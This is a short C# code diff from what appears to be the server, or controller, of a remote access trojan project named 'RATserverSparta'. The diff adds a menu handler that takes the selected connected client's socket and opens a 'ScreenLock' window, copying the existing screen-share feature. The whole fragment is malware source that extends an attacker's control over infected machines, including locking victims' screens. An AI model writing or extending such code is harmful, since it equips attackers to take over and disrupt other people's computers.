@@ -160,5 +160,17 @@ namespace RATserverSparta
                 ScreenShare.Show();
             }
         }
+
+        private void screenLockToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            if (SendDataAfterChecks(0))
+            {
+                string SelectedClientString = ClientsList.SelectedItems[ClientsList.SelectedItems.Count - 1].Text;
+                Socket SelectedClientSocket = this.SocketServerClassInstance.ClientSocketMap[SelectedClientString];
+
+                ScreenLock ScreenShare = new ScreenLock(SelectedClientSocket);
+                ScreenShare.Show();
+            }
+        }
     }
 }
